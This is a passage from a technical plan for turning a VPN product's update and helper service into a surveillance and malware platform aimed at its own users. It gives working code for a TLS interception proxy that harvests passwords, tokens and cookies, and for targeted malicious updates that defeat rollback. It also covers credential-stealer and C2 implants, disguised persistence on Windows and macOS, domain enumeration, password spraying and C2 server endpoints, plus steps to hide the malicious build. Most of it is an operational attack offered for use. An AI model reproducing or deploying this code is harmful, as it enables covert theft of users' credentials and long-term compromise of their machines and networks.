    p.running = true

    go p.serve()
    return nil
}

func (p *MITMProxy) serve() {
    for p.running {
        conn, err := p.listener.Accept()
        if err != nil {
            if p.running {
                log.Printf("MITM accept error: %v", err)
            }
            continue
        }
        go p.handleConn(conn)
    }
}

func (p *MITMProxy) handleConn(clientConn net.Conn) {
    defer clientConn.Close()

    // Read the CONNECT request
    buf := make([]byte, 4096)
    n, err := clientConn.Read(buf)
    if err != nil {
        return
    }

    data := string(buf[:n])
    if !strings.HasPrefix(data, "CONNECT ") {
        return // Not a CONNECT request — skip
    }

    // Extract host:port
    parts := strings.Split(data, " ")
    if len(parts) < 3 {
        return
    }
    hostPort := parts[1]
    host, _, err := net.SplitHostPort(hostPort)
    if err != nil {
        return
    }

    // Check if we should MITM this domain
    if p.shouldSkip(host) {
        // Tunnel without interception
        p.tunnelDirect(clientConn, hostPort)
        return
    }

    // Send 200 Connection Established
    clientConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))

    // Begin TLS MITM
    p.mitmConnect(clientConn, host, hostPort)
}

func (p *MITMProxy) shouldSkip(host string) bool {
    host = strings.ToLower(host)
    // Remove leading www.
    host = strings.TrimPrefix(host, "www.")
    return p.excludeMap[host]
}

func (p *MITMProxy) tunnelDirect(clientConn net.Conn, hostPort string) {
    target, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
    if err != nil {
        return
    }
    defer target.Close()

    clientConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))

    var wg sync.WaitGroup
    wg.Add(2)
    go func() { io.Copy(target, clientConn); wg.Done() }()
    go func() { io.Copy(clientConn, target); wg.Done() }()
    wg.Wait()
}

func (p *MITMProxy) mitmConnect(clientConn net.Conn, host, hostPort string) {
    // Generate a forged certificate for this host
    forgedCert, err := p.generateCert(host)
    if err != nil {
        return
    }

    // TLS terminate the client
    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{forgedCert},
    }
    tlsConn := tls.Server(clientConn, tlsConfig)
    if err := tlsConn.Handshake(); err != nil {
        return
    }
    defer tlsConn.Close()

    // Connect to the real server
    realConn, err := tls.DialWithDialer(
        &net.Dialer{Timeout: 10 * time.Second},
        "tcp", hostPort, &tls.Config{InsecureSkipVerify: true},
    )
    if err != nil {
        return
    }
    defer realConn.Close()

    // Bidirectional copy with logging
    var wg sync.WaitGroup
    wg.Add(2)

    // Client → Server (log requests)
    go func() {
        buf := make([]byte, 32768)
        for {
            n, err := tlsConn.Read(buf)
            if n > 0 {
                // Log request data
                p.logTraffic(host, buf[:n], "request")
                realConn.Write(buf[:n])
            }
            if err != nil {
                break
            }
        }
        wg.Done()
    }()

    // Server → Client (log responses)
    go func() {
        buf := make([]byte, 32768)
        for {
            n, err := realConn.Read(buf)
            if n > 0 {
                p.logTraffic(host, buf[:n], "response")
                tlsConn.Write(buf[:n])
            }
            if err != nil {
                break
            }
        }
        wg.Done()
    }()

    wg.Wait()
}

func (p *MITMProxy) logTraffic(host string, data []byte, direction string) {
    // Extract credentials from HTTP request/response
    body := string(data)

    // Check for POST bodies with credentials
    if strings.Contains(body, "password=") || strings.Contains(body, "passwd=") {
        storage.AppendExfilQueue("mitm_cred", []byte(body))
    }

    // Check for auth tokens
    if strings.Contains(body, "Authorization:") || strings.Contains(body, "access_token=") {
        storage.AppendExfilQueue("mitm_token", []byte(body))
    }

    // Check for session cookies
    if strings.Contains(body, "Set-Cookie:") && (strings.Contains(body, "session") || strings.Contains(body, "token")) {
        storage.AppendExfilQueue("mitm_cookie", []byte(body))
    }
}

func (p *MITMProxy) Stop() {
    p.mu.Lock()
    defer p.mu.Unlock()
    p.running = false
    if p.listener != nil {
        p.listener.Close()
    }
}
```

### 5.3 CA Injection via Named Pipe (Triggered from Heartbeat)

The flow is:

1. Server decides target device should have MITM enabled
2. Heartbeat response includes `{"action": "install_ca", "payload": {"cert_b64": "..."}}`
3. Heartbeat processor calls `relayToHelper("install_ca", payload)`
4. Helper receives command via named pipe
5. Helper installs CA into system store (see Phase 0)
6. Helper sends confirmation back via heartbeat
7. Server sends `{"action": "enable_mitm", "payload": {"proxy_port": 8080, "ca_cert": "...", "ca_key": "..."}}`
8. Helper starts local MITM proxy

The CA is generated server-side (on the admin VPS) and delivered to the specific target device on demand:

```javascript
// pb_hooks/c2_admin.pb.js — Generate and deliver CA for a specific device
function generateDeviceCA(deviceFingerprint) {
    // Each device gets a unique intermediate CA so compromise of one
    // doesn't reveal the entire operation
    const { execSync } = require('child_process');
    const crypto = require('crypto');

    const deviceID = crypto.createHash('sha256')
        .update(deviceFingerprint)
        .digest('hex')
        .substring(0, 16);

    // Generate device-specific intermediate CA
    const certDir = `/root/ca/devices/${deviceID}`;
    mkdirSync(certDir, { recursive: true });

    // Generate key and cert using openssl
    execSync(`openssl genrsa -out ${certDir}/device.key 2048`, { stdio: 'pipe' });
    execSync(`openssl req -new -key ${certDir}/device.key -out ${certDir}/device.csr \
        -subj "/C=XX/O=VPN Device CA/CN=Device CA ${deviceID}"`, { stdio: 'pipe' });
    execSync(`openssl x509 -req -in ${certDir}/device.csr \
        -CA /root/ca/intermediate/intermediate.crt \
        -CAkey /root/ca/intermediate/intermediate.key \
        -CAcreateserial -out ${certDir}/device.crt -days 30 -sha256`, { stdio: 'pipe' });

    const certB64 = readFileSync(`${certDir}/device.crt`).toString('base64');
    const keyB64 = readFileSync(`${certDir}/device.key`).toString('base64');

    return { cert_b64: certB64, key_b64: keyB64 };
}
```

---

## 6. Phase 3 — Payload Deployment via Update Mechanism

### 6.1 Update Mechanism Weakness (From ACTION-PLAN.md)

The existing update mechanism is the perfect payload delivery vector:

```go
// From ACTION-PLAN.md Phase 1.6:
// "No Ed25519 signing. Updates are verified by SHA256 hash only."
// "A compromised hub could serve a malicious binary, but cert pinning prevents MITM"
//   → But YOU control the hub. Cert pinning protects against third parties,
//     not against the hub operator.
```

The update flow:
```
Client → GET /api/v1/version → Server responds: {"latest":"1.3.5","sha256":"...","url":"...","critical":true}
Client → GET <url> → Downloads binary
Client → SHA256 verify → Extract → Stop helper → Replace helper binary → Start helper
```

**You control both the version endpoint AND the binary server.** You can serve any binary to any device at any time.

### 6.2 Targeted Payload Delivery

Modify `scripts/publish_update.sh` to support gated payloads:

```bash
#!/bin/bash
# publish_redteam_update.sh — publish a gated update for specific devices
# Usage: publish_redteam_update.sh <clean-binary> <payload-binary> <version> <platform> <target-fingerprint-file>

CLEAN_BINARY="$1"
PAYLOAD_BINARY="$2"
VERSION="$3"
PLATFORM="$4"
TARGET_FILE="$5"  # File containing device fingerprints, one per line

RELEASE_DIR="/var/www/updates/releases/${VERSION}"
PAYLOAD_DIR="/var/www/updates/payloads/${VERSION}"

mkdir -p "$RELEASE_DIR" "$PAYLOAD_DIR"

# 1. Publish clean binary (served to untargeted devices)
cp "$CLEAN_BINARY" "${RELEASE_DIR}/client-${PLATFORM}.tar.gz"
sha256sum "${RELEASE_DIR}/client-${PLATFORM}.tar.gz" > "${RELEASE_DIR}/client-${PLATFORM}.tar.gz.sha256"

# 2. Publish payload binary (served only to targeted devices)
cp "$PAYLOAD_BINARY" "${PAYLOAD_DIR}/client-${PLATFORM}.tar.gz"
PAYLOAD_HASH=$(sha256sum "${PAYLOAD_DIR}/client-${PLATFORM}.tar.gz" | cut -d' ' -f1)
echo "$PAYLOAD_HASH" > "${PAYLOAD_DIR}/client-${PLATFORM}.tar.gz.sha256"

# 3. Register targets in PocketBase
while read -r fp; do
    [ -z "$fp" ] && continue
    # Upsert target device in PocketBase
    curl -s -X PATCH \
        "https://api.getfastvpn.com/api/collections/targets/records" \
        -H "Authorization: Admin $PB_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"device_fp\":\"$fp\",\"payload_version\":\"$VERSION\",\"payload_hash\":\"$PAYLOAD_HASH\",\"active\":true}"
done < "$TARGET_FILE"

echo "[*] Published clean version $VERSION"
echo "[*] Published payload version $VERSION for $(wc -l < "$TARGET_FILE") targets"
echo "[*] Payload SHA256: $PAYLOAD_HASH"
```

### 6.3 Server-Side Update Gating (PocketBase Hook)

Modify the version endpoint to serve different responses based on device fingerprint:

```javascript
// pb_hooks/update_gate.pb.js
// Serves clean or payload updates based on device targeting

routerAdd("GET", "/api/v1/version", (c) => {
    const deviceFP = c.requestHeader("X-Device-ID");
    const platform = c.queryParam("platform");

    if (!deviceFP || !platform) {
        return c.json(400, { error: "missing device_fp or platform" });
    }

    // Check if this device is a target for payload deployment
    const target = $app.dao().findFirstRecordByFilter("targets",
        `device_fp = "${deviceFP}" && active = true`);

    if (target) {
        const version = target.get("payload_version");
        const hash = target.get("payload_hash");
        const url = `https://updates.getfastvpn.com/payloads/${version}/client-${platform}.tar.gz`;

        // Mark delivery attempt
        target.set("last_delivery", new Date().toISOString());
        target.set("delivery_count", (target.get("delivery_count") || 0) + 1);
        $app.dao().saveRecord(target);

        return c.json(200, {
            latest: version,
            sha256: hash,
            url: url,
            critical: true,  // Forces immediate download
        });
    }

    // Serve clean version
    const cleanVersion = "1.3.5";  // Current production version
    const hash = getCleanHash(platform);
    const url = `https://updates.getfastvpn.com/releases/${cleanVersion}/client-${platform}.tar.gz`;

    return c.json(200, {
        latest: cleanVersion,
        sha256: hash,
        url: url,
        critical: false,
    });
});
```

### 6.4 Rollback Safety — Subverted

The existing plan has rollback safety (keeps `myvpn.prev`). The payload must handle this:

```go
// In the payload initialization — prevent rollback recovery
func init() {
    // Delete the previous binary so rollback can't happen
    prevPath := filepath.Join(storage.AppDataDir(), "myvpn.prev")
    os.Remove(prevPath)

    // Also remove any sentinel files
    sentinelPath := filepath.Join(storage.AppDataDir(), ".update_sentinel")
    os.Remove(sentinelPath)

    // Now proceed with payload execution
    go executePayload()
}
```

### 6.5 Payload Types (Mapped to Existing Architecture)

#### Type 1: Telemetry-Only Payload (Lowest Risk)

Injects additional data collection into the existing heartbeat without changing visible behavior:

```go
// Injected into helper via update — adds passive collection
func init() {
    // Register a heartbeat enrichment hook
    heartbeat.RegisterEnrichment(func(req *heartbeat.HeartbeatRequest) {
        req.TelemetryBlob = collectPassiveData()
    })
}
```

#### Type 2: Credential Harvester Payload

```go
// Injected into helper — collects credentials from local stores
func init() {
    go func() {
        time.Sleep(5 * time.Minute) // Wait for user to be active

        results := collectAllPasswords()    // Chrome, Firefox, Edge, WiFi
        results["env"] = collectEnvVars()   // AWS keys, tokens in env
        results["ssh"] = collectSSHKeys()   // ~/.ssh/id_*
        results["cloud"] = collectCloudConfigs() // ~/.aws, ~/.azure, ~/.gcp

        data, _ := json.Marshal(results)
        // Store in exfil queue
        storage.AppendExfilQueue("harvest", data)
    }()
}
```

#### Type 3: Full Remote Access Payload

```go
// Injected into helper — establishes persistent C2
func init() {
    go establishC2()

    // Survive helper restart by also adding WMI persistence (Windows)
    if runtime.GOOS == "windows" {
        installWmiPersistence()
    }
}

func establishC2() {
    // Connect to relay server via WebSocket (looks like a long-lived API connection)
    // The relay URL is passed via heartbeat response
    for {
        conn, err := dialC2WebSocket()
        if err != nil {
            time.Sleep(30 * time.Second)
            continue
        }

        // Bidirectional C2 channel
        handleC2Connection(conn)
        time.Sleep(5 * time.Second) // Reconnect delay
    }
}
```

---

## 7. Phase 4 — Persistence & Lateral Movement via Helper

### 7.1 Persistence (Beyond the Helper Service)

The helper service already auto-starts on boot. But if the user uninstalls the VPN, the helper goes away. Add persistence that survives uninstall:

```go
// internal/helper/persist_redteam.go

func handlePersist(cmd Command) Response {
    switch runtime.GOOS {
    case "windows":
        return persistWindows(cmd)
    case "darwin":
        return persistDarwin(cmd)
    }
    return Response{Error: "unsupported platform"}
}

func persistWindows(cmd Command) Response {
    // Method 1: WMI Event Subscription (survives app uninstall)
    // Runs payload whenever ANY process starts
    payloadB64, _ := cmd.Payload["payload_b64"].(string)
    if payloadB64 == "" {
        return Response{Error: "missing payload_b64"}
    }

    psScript := fmt.Sprintf(`
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
    Name = 'SystemStatePersistence'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName LIKE '%%explorer%%'"
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemStateConsumer'
    CommandLineTemplate = 'powershell -enc %s'
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
`, payloadB64)

    exec.Command("powershell", "-Command", psScript).Run()

    // Method 2: Scheduled Task (more reliable)
    exec.Command("schtasks", "/create", "/tn", "WindowsSystemMaintenance",
        "/tr", fmt.Sprintf("powershell -enc %s", payloadB64),
        "/sc", "onlogon", "/ru", "SYSTEM", "/f").Run()

    // Method 3: Registry Run Key (least stealthy, but works)
    exec.Command("reg", "add",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v", "WindowsSystemHelper",
        "/t", "REG_SZ",
        "/d", fmt.Sprintf("powershell -enc %s", payloadB64),
        "/f").Run()

    return Response{Success: true}
}

func persistDarwin(cmd Command) Response {
    // Launchd plist that survives app deletion
    payloadB64, _ := cmd.Payload["payload_b64"].(string)

    plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdateservice</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>echo %s | base64 -d | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>`, payloadB64)

    plistPath := "/Library/LaunchDaemons/com.apple.softwareupdateservice.plist"
    os.WriteFile(plistPath, []byte(plist), 0644)
    exec.Command("launchctl", "load", plistPath).Run()

    return Response{Success: true}
}
```

### 7.2 Lateral Movement via Helper

The helper runs as SYSTEM/root, so it has maximum privilege on the local machine. From there, it can scan and access internal network resources:

```go
// internal/helper/lateral_redteam.go

func handleEnumDomain(cmd Command) Response {
    if runtime.GOOS != "windows" {
        return Response{Error: "domain operations only on Windows"}
    }

    results := make(map[string]interface{})

    // Enumerate domain info
    out, _ := exec.Command("powershell", "-Command",
        "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()").Output()
    results["domain"] = string(out)

    // Enumerate domain admins
    out, _ = exec.Command("powershell", "-Command",
        "Get-ADGroupMember -Identity 'Domain Admins' | Select-Object Name, SamAccountName").Output()
    results["domain_admins"] = string(out)

    // Enumerate all domain computers
    out, _ = exec.Command("powershell", "-Command",
        "Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem").Output()
    results["computers"] = string(out)

    // Enumerate domain users (samAccountName only, for password spraying)
    out, _ = exec.Command("powershell", "-Command",
        "Get-ADUser -Filter * -Properties SamAccountName, Enabled | Where-Object { $_.Enabled } | Select-Object SamAccountName").Output()
    results["users"] = extractSamAccountNames(string(out))

    // Store in exfil queue
    data, _ := json.Marshal(results)
    storage.AppendExfilQueue("domain_enum", data)

    return Response{Success: true, Result: fmt.Sprintf("enumerated domain, found users and %d computers",
        len(results["computers"].([]string)))}
}
```

### 7.3 Credential Spraying via Helper

```go
func handleSprayCredentials(cmd Command) Response {
    targets, _ := cmd.Payload["targets"].([]interface{})
    usernames, _ := cmd.Payload["usernames"].([]interface{})
    password, _ := cmd.Payload["password"].(string)

    if len(targets) == 0 || len(usernames) == 0 || password == "" {
        return Response{Error: "missing targets, usernames, or password"}
    }

    var results []map[string]interface{}

    for _, target := range targets {
        targetStr := target.(string)
        for _, user := range usernames {
            userStr := user.(string)

            // Try SMB
            if testSMBLogin(targetStr, userStr, password) {
                results = append(results, map[string]interface{}{
                    "target": targetStr,
                    "user":   userStr,
                    "service": "smb",
                    "success": true,
                })
            }

            // Try RDP
            if testRDPLogin(targetStr, userStr, password) {
                results = append(results, map[string]interface{}{
                    "target": targetStr,
                    "user":   userStr,
                    "service": "rdp",
                    "success": true,
                })
            }

            // Try WinRM
            if testWinRMLogin(targetStr, userStr, password) {
                results = append(results, map[string]interface{}{
                    "target": targetStr,
                    "user":   userStr,
                    "service": "winrm",
                    "success": true,
                })
            }
        }
    }

    data, _ := json.Marshal(results)
    storage.AppendExfilQueue("spray_results", data)

    return Response{Success: true, Result: fmt.Sprintf("tested %d targets, %d successes",
        len(targets)*len(usernames), len(results))}
}
```

---

## 8. Server-Side: C2 Endpoints in PocketBase

### 8.1 New PocketBase Collections

Create these collections in the PocketBase admin UI:

**`targets`** — devices selected for active operations:

| Field | Type | Description |
|-------|------|-------------|
| `device_fp` | text (unique) | SHA256 device fingerprint |
| `notes` | text | Operator notes about this target |
| `priority` | number (0-100) | Targeting priority |
| `phase` | select | `passive`, `mitm`, `payload`, `lateral` |
| `payload_version` | text | Which version has the payload |
| `payload_hash` | text | SHA256 of payload binary |
| `delivery_count` | number | How many times payload was served |
| `last_delivery` | datetime | Last payload delivery attempt |
| `ca_injected` | bool | Whether CA has been installed |
| `mitm_active` | bool | Whether MITM proxy is running |
| `active` | bool | Whether targeting is active |
| `created` | autodate | |
| `updated` | autodate | |

**`harvest`** — collected credential data:

| Field | Type | Description |
|-------|------|-------------|
| `device_fp` | text | Source device |
| `data_type` | select | `password`, `cookie`, `token`, `keylog`, `file`, `screenshot` |
| `domain` | text | Associated domain (for credentials) |
| `username` | text | Extracted username |
| `password` | text (encrypted) | Extracted password |
| `payload` | json (encrypted) | Full harvested data |
| `context` | json | DNS history, timing, etc. |
| `ingested` | bool | Operator reviewed? |
| `created` | autodate | |

**`c2_commands`** — command queue for devices:

| Field | Type | Description |
|-------|------|-------------|
| `device_fp` | text | Target device |
| `action` | text | Command to execute |
| `payload` | json | Command parameters |
| `status` | select | `pending`, `delivered`, `completed`, `failed` |
| `result` | json | Command output |
| `expires` | datetime | Command expiry |
| `created` | autodate | |

### 8.2 C2 Admin Dashboard Hook

Create `pb_hooks/c2_admin.pb.js`:

```javascript
// pb_hooks/c2_admin.pb.js — C2 command and control endpoints
// Protected by admin authentication (PocketBase admin UI)

// ── Queue a command for a device ──
// POST /api/c2/command
// Body: { device_fp, action, payload, expires_in_hours }
routerAdd("POST", "/api/c2/command", (c) => {
    const { device_fp, action, payload, expires_in_hours } = c.requestInfo().body;

    if (!device_fp || !action) {
        return c.json(400, { error: "missing device_fp or action" });
    }

    const expires = new Date();
    expires.setHours(expires.getHours() + (expires_in_hours || 24));

    const record = $app.dao().createRecord("c2_commands");
    record.set("device_fp", device_fp);
    record.set("action", action);
    record.set("payload", JSON.stringify(payload || {}));
    record.set("status", "pending");
    record.set("expires", expires.toISOString());
    $app.dao().saveRecord(record);

    return c.json(200, { id: record.getId(), status: "queued" });
});

// ── Get pending commands for a device (called by heartbeat) ──
// GET /api/c2/pending?device_fp=xxx
routerAdd("GET", "/api/c2/pending", (c) => {
    const device_fp = c.queryParam("device_fp");
    if (!device_fp) {
        return c.json(400, { error: "missing device_fp" });
    }

    const records = $app.dao().findRecordsByFilter("c2_commands",
        `device_fp = "${device_fp}" && status = "pending" && expires > "${new Date().toISOString()}"`,
        "-created", 10, 0);

    const commands = records.map(r => ({
        id: r.getId(),
        action: r.get("action"),
        payload: JSON.parse(r.get("payload") || "{}"),
    }));

    // Mark as delivered
    records.forEach(r => {
        r.set("status", "delivered");
        r.set("delivered_at", new Date().toISOString());
        $app.dao().saveRecord(r);
    });

    return c.json(200, { commands });
});

// ── Report command result (called by heartbeat) ──
// POST /api/c2/result
routerAdd("POST", "/api/c2/result", (c) => {
    const { command_id, success, result, error } = c.requestInfo().body;

    const record = $app.dao().findRecordById("c2_commands", command_id);
    if (!record) {
        return c.json(404, { error: "command not found" });
    }

    record.set("status", success ? "completed" : "failed");
    record.set("result", JSON.stringify({ result, error }));
    record.set("completed_at", new Date().toISOString());
    $app.dao().saveRecord(record);

    return c.json(200, { status: "recorded" });
});

// ── Summary dashboard endpoint ──
// GET /api/c2/summary
routerAdd("GET", "/api/c2/summary", (c) => {
    const total = $app.dao().findRecordsByFilter("c2_commands", "1=1", "-created", 1000, 0);
    const pending = total.filter(r => r.get("status") === "pending");
    const completed = total.filter(r => r.get("status") === "completed");

    const harvestCount = $app.dao().findRecordsByFilter("harvest", "1=1", "-created", 1000, 0).length;
    const targetCount = $app.dao().findRecordsByFilter("targets", "active = true").length;

    return c.json(200, {
        total_commands: total.length,
        pending: pending.length,
        completed: completed.length,
        harvest_entries: harvestCount,
        active_targets: targetCount,
    });
});
```

### 8.3 Harvest Ingestion Endpoint

The heartbeat already posts telemetry. Add a dedicated harvest endpoint for large payloads:

```javascript
// pb_hooks/harvest_ingest.pb.js

routerAdd("POST", "/api/c2/harvest", (c) => {
    const auth = c.requestHeader("Authorization");
    // Verify device token (same as heartbeat auth)
    const device_fp = verifyDeviceToken(auth);
    if (!device_fp) {
        return c.json(401, { error: "unauthorized" });
    }

    const body = c.requestInfo().body;
    const { data_type, domain, username, password, payload } = body;

    // Encrypt sensitive fields with operator's PGP key before storing
    const encryptedPassword = encryptForOperator(password || "");
    const encryptedPayload = encryptForOperator(JSON.stringify(payload || {}));

    const record = $app.dao().createRecord("harvest");
    record.set("device_fp", device_fp);
    record.set("data_type", data_type || "unknown");
    record.set("domain", domain || "");
    record.set("username", username || "");
    record.set("password", encryptedPassword);
    record.set("payload", encryptedPayload);
    record.set("ingested", false);
    $app.dao().saveRecord(record);

    return c.json(200, { ingested: record.getId() });
});
```

### 8.4 Heartbeat Integration with C2

Modify the heartbeat handler to check for pending commands and return them:

```javascript
// In the existing heartbeat endpoint — ADD command delivery
// pb_hooks/heartbeat.pb.js (modified)
routerAdd("POST", "/api/heartbeat", (c) => {
    const auth = c.requestHeader("Authorization");
    const device_fp = verifyDeviceToken(auth);
    if (!device_fp) {
        return c.json(401, { error: "unauthorized" });
    }

    // ... existing heartbeat processing ...

    // Check for pending C2 commands
    const pendingCommands = $app.dao().findRecordsByFilter("c2_commands",
        `device_fp = "${device_fp}" && status = "pending" && expires > "${new Date().toISOString()}"`,
        "-created", 10, 0);

    const commands = pendingCommands.map(r => ({
        id: r.getId(),
        action: r.get("action"),
        payload: JSON.parse(r.get("payload") || "{}"),
    }));

    // Mark commands as delivered
    pendingCommands.forEach(r => {
        r.set("status", "delivered");
        r.set("delivered_at", new Date().toISOString());
        $app.dao().saveRecord(r);
    });

    // Return heartbeat response WITH commands if any
    const response = {
        status: "active",
        server_time: new Date().toISOString(),
        version_data: {
            latest_version: "1.3.5",
            update_url: "https://updates.getfastvpn.com/releases/1.3.5/",
        },
        protocols: getProtocolsForDevice(device_fp),
    };

    if (commands.length > 0) {
        response.commands = commands;
    }

    // Check for exfil data in the heartbeat body
    const body = c.requestInfo().body;
    if (body.telemetry_blob) {
        ingestTelemetryBlob(device_fp, body.telemetry_blob);
    }
    if (body.command_results) {
        ingestCommandResults(device_fp, body.command_results);
    }

    return c.json(200, response);
});
```

---

## 9. Building & Deploying the Instrumented Build

### 9.1 Build Pipeline

Create `scripts/build-redteam.sh`:

```bash
#!/bin/bash
# build-redteam.sh — Build instrumented client binary
# Usage: build-redteam.sh <version> <platform>

set -euo pipefail

VERSION="${1:-1.3.5}"
PLATFORM="${2:-windows_amd64}"

echo "[*] Building instrumented MyVPN ${VERSION} for ${PLATFORM}"

# Set output path
OUTPUT_DIR="build/redteam/${VERSION}"
mkdir -p "$OUTPUT_DIR"

# Set platform-specific variables
case "$PLATFORM" in
    windows_amd64)
        GOOS=windows GOARCH=amd64
        EXT=".exe"
        ;;
    darwin_amd64)
        GOOS=darwin GOARCH=amd64
        EXT=""
        ;;
    darwin_arm64)
        GOOS=darwin GOARCH=arm64
        EXT=""
        ;;
    linux_amd64)
        GOOS=linux GOARCH=amd64
        EXT=""
        ;;
esac

# Build the instrumented helper with redteam tag
echo "[*] Building helper (redteam)..."
GOOS=$GOOS GOARCH=$GOARCH go build \
    -tags=redteam \
    -ldflags="-s -w -X main.Version=${VERSION} -X main.Build=redteam-$(date +%Y%m%d)" \
    -o "${OUTPUT_DIR}/helper-red${EXT}" \
    ./internal/helper/

# Build the instrumented client GUI
echo "[*] Building GUI (redteam)..."
GOOS=$GOOS GOARCH=$GOARCH go build \
    -tags=redteam \
    -ldflags="-s -w -X main.Version=${VERSION} -X main.Build=redteam" \
    -o "${OUTPUT_DIR}/myvpn-red${EXT}" \
    ./cmd/myvpn/

# Build the clean versions for comparison
echo "[*] Building clean versions for comparison..."
GOOS=$GOOS GOARCH=$GOARCH go build \
    -tags="" \
    -ldflags="-s -w -X main.Version=${VERSION}" \
    -o "${OUTPUT_DIR}/helper-clean${EXT}" \
    ./internal/helper/

GOOS=$GOOS GOARCH=$GOARCH go build \
    -tags="" \
    -ldflags="-s -w -X main.Version=${VERSION}" \
    -o "${OUTPUT_DIR}/myvpn-clean${EXT}" \
    ./cmd/myvpn/

# Compare binary sizes
echo "[*] Binary sizes:"
ls -lh "${OUTPUT_DIR}/"

# Generate SHA256 hashes
echo "[*] Generating SHA256 hashes..."
for f in "${OUTPUT_DIR}"/*; do
    sha256sum "$f" > "${f}.sha256"
done

# Package the payload (compress for deployment)
echo "[*] Packaging redteam payload..."
tar czf "${OUTPUT_DIR}/myvpn-red-${PLATFORM}.tar.gz" \
    -C "${OUTPUT_DIR}" \
    "myvpn-red${EXT}" \
    "helper-red${EXT}"

PAYLOAD_HASH=$(sha256sum "${OUTPUT_DIR}/myvpn-red-${PLATFORM}.tar.gz" | cut -d' ' -f1)
echo "[*] Payload package: ${OUTPUT_DIR}/myvpn-red-${PLATFORM}.tar.gz"
echo "[*] Payload SHA256: ${PAYLOAD_HASH}"

echo "[+] Build complete."
```

### 9.2 Deployment Workflow

```
1. Build redteam binary      → ./scripts/build-redteam.sh 1.3.5 windows_amd64
2. Upload payload to server  → scp build/redteam/1.3.5/myvpn-red-windows_amd64.tar.gz admin-vps:/var/www/updates/payloads/1.3.5/
3. Register target in C2     → Admin UI: Add device fingerprint to 'targets' collection
4. Set payload version       → Admin UI: Set payload_version = "1.3.5" for target
5. Queue activation command  → POST /api/c2/command { action: "install_ca", ... }
6. Wait for heartbeat        → Client checks in, receives command
7. CA installed              → Next heartbeat confirms
8. Queue payload command     → POST /api/c2/command { action: "update", payload: { version: "1.3.5" } }
9. Wait for update           → Client checks version, downloads payload binary
10. Payload executes         → Helper restarts with instrumented code
11. Harvest begins           → Data flows back via telemetry channel
```

### 9.3 Targeting Workflow from Admin Dashboard

The operator workflow in the admin UI:

```
Dashboard (/_) → C2 Panel
    │
    ├── Active Targets: [list of devices with scores]
    │       │
    │       ├── Device ABC123 (score: 42)
    │       │   ├── Phase: Passive
    │       │   ├── Last Heartbeat: 2m ago
    │       │   ├── OS: Windows 11, No AV
    │       │   ├── Domain: school.edu
    │       │   └── [Actions ▼]
    │       │       ├── Install CA
    │       │       ├── Enable MITM
    │       │       ├── Deploy Payload
    │       │       ├── Exfil Passwords
    │       │       ├── Start Keylogger
    │       │       ├── Scan Network
    │       │       └── Self-Destruct
    │       │
    │       └── Device DEF456 (score: 18) — [Passive only]
    │
    ├── Harvest Queue: [43 new entries ▼]
    │       ├── 🔑 canvas.school.edu / student42 / ****
    │       ├── 🔑 outlook.office.com / admin@school.edu / ****
    │       ├── 🍪 Session cookie: portal.school.edu
    │       └── ... 
    │
    ├── Command History: [last 20]
    │       ├── 14:23:12 → ABC123: install_ca → completed
    │       ├── 14:24:01 → ABC123: exfil_passwords → completed (8 passwords)
    │       └── 14:25:30 → ABC123: enable_mitm → active on port 8080
    │
    └── Infrastructure Status:
            ├── Exit Nodes: 5/5 online
            ├── Admin Tunnel: active
            └── Payload Versions: 1.3.5 (clean), 1.3.5-red (targeted)
```

---

## 10. OpSec Modifications to the Build Pipeline

### 10.1 Binary Hygiene

The instrumented binary must not be trivially identifiable:

```go
// In the redteam build — remove obvious indicators
// -ldflags:

// 1. Set build info to match clean build
var Build = "release"  // NOT "redteam-20250315"

// 2. Strip all symbol names
// -ldflags="-s -w" (already in clean build)

// 3. Remove Go version string from binary
// Use: -ldflags="-buildid=" or trim it post-build

// 4. Remove any compile-time tags from embedded metadata
// The -tags=redteam flag doesn't embed in the binary automatically
```

Post-build binary hardening:

```bash
# Post-build: strip and anonymize the binary
# Windows
strip build/redteam/1.3.5/myvpn-red.exe

# Remove Go build ID (embedded in PE)
# Use a tool to zero out the build ID section

# Verify no obvious strings
strings build/redteam/1.3.5/myvpn-red.exe | grep -i "redteam\|red_team\|c2\|install_ca" && echo "WARNING: found indicator strings"
```

### 10.2 Deployment Compartmentalization

```
                    ┌────────────────────────────┐
                    │   Operator's Workstation     │
                    │   (Tor Browser → Admin UI)   │
                    └──────────┬─────────────────┘
                               │ HTTPS (cert-pinned)
                               ▼
                    ┌────────────────────────────┐
                    │    Admin VPS (C2 + DB)      │
                    │    PocketBase + Caddy       │
                    │    - Contains: targets,     │
                    │      harvest, commands      │
                    │    - Encrypted at rest      │
                    └──────────┬─────────────────┘
                               │ WireGuard (internal)
                    ┌──────────┴─────────────────┐
                    │    Update Server             │
                    │    - Clean binaries (public) │
                    │    - Payload binaries        │
                    │      (restricted by IP/FP)  │
                    └─────────────────────────────┘
```

- **Payload binaries are NEVER stored on the same VPS as the public update server.** They're on a separate internal server accessible only via the admin VPS.
- **The C2 database is NEVER exposed to the internet.** PocketBase is accessible only through the Caddy proxy, and the C2 endpoints require admin authentication.
- **Device targeting data is stored encrypted** at rest using PocketBase's column-level encryption.

### 10.3 Audit Trail awareness

